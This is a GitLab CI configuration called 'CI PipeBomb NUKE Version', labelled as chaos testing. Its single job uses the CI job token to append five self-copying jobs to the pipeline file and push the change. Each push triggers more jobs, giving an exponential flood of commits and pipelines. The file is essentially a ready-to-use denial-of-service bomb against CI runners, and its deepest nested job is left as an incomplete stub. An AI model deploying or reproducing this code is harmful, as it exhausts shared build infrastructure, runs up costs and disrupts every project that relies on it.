# CI PipeBomb NUKE Version
# Exponential growth chaos testing - USE WITH EXTREME CAUTION

stages: [arm]

ci_pipebomb_arm:
  stage: arm
  image: alpine:latest
  rules:
    - if: '$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "demolition-bot@example.com"
    - git config --global user.name "CI Demolition Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_HOST}/${CI_PROJECT_PATH}.git"
      git fetch ci "${CI_COMMIT_REF_NAME}"
    - COUNT=$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
    - echo "ðŸ’£ Current explosions registered: ${COUNT}"
    
    # Create multiple new jobs (exponential growth)
    - |
      for i in $(seq 1 5); do
        CHARGE_NAME="pipebomb_explosion_$(date +%s)_${CI_PIPELINE_IID}_${i}"
        cat >> .gitlab-ci.yml <<EOF

${CHARGE_NAME}:
  stage: arm
  image: alpine:latest
  rules:
    - if: '\$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "demolition-bot@example.com"
    - git config --global user.name "CI Demolition Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:\${CI_JOB_TOKEN}@\${CI_SERVER_HOST}/\${CI_PROJECT_PATH}.git"
      git fetch ci "\${CI_COMMIT_REF_NAME}"
    - |
      COUNT=\$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
      echo "ðŸ’£ Current explosions registered: \${COUNT}"
    - |
      for j in \$(seq 1 5); do
        NEW_CHARGE_NAME="pipebomb_explosion_\$(date +%s)_\${CI_PIPELINE_IID}_\${j}"
        cat >> .gitlab-ci.yml <<EOE

\${NEW_CHARGE_NAME}:
  stage: arm
  image: alpine:latest
  rules:
    - if: '\\\$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "demolition-bot@example.com"
    - git config --global user.name "CI Demolition Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:\\\${CI_JOB_TOKEN}@\\\${CI_SERVER_HOST}/\\\${CI_PROJECT_PATH}.git"
      git fetch ci "\\\${CI_COMMIT_REF_NAME}"
    - |
      COUNT=\\\$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
      echo "ðŸ’£ Current explosions registered: \\\${COUNT}"
    - |
      for k in \\\$(seq 1 5); do
        NEXT_CHARGE_NAME="pipebomb_explosion_\\\$(date +%s)_\\\${CI_PIPELINE_IID}_\\\${k}"
        cat >> .gitlab-ci.yml <<EOE

\\\${NEXT_CHARGE_NAME}:
  # Exponential growth continues...
EOE
      done
    - git add .gitlab-ci.yml
    - git commit -m "CI PipeBomb plants \${NEW_CHARGE_NAME}"
    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
EOE
      done
    - git add .gitlab-ci.yml
    - git commit -m "CI PipeBomb plants \${CHARGE_NAME}"
    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
EOF
      done
    - git add .gitlab-ci.yml
    - git commit -m "CI PipeBomb plants multiple charges"
    - git push ci "${CI_COMMIT_REF_NAME}:${CI_COMMIT_REF_NAME}"